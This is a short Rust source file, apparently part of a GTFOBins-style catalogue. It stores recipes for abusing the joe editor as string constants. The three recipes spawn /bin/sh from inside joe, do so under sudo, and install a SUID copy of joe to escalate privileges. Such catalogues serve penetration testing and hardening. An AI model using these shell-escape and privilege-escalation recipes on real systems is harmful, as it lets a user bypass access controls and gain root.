pub static BIN_NAME: &'static str = "joe";
pub static SH_CODE: &'static str = r#"
    
    joe
    ^K!/bin/sh
"#;
pub static SUDO_CODE: &'static str = r#"
    
    sudo joe
    ^K!/bin/sh
"#;
pub static LSUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which joe) .

    ./joe
    ^K!/bin/sh
"#;
use crate::code::{Code, Tag};
pub static SH: Code<'static> = Code { 
	title: "SH_CODE",
	code: SH_CODE,
	tag: Tag::SH,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
pub static LSUID: Code<'static> = Code { 
	title: "LSUID_CODE",
	code: LSUID_CODE,
	tag: Tag::LSUID,
};
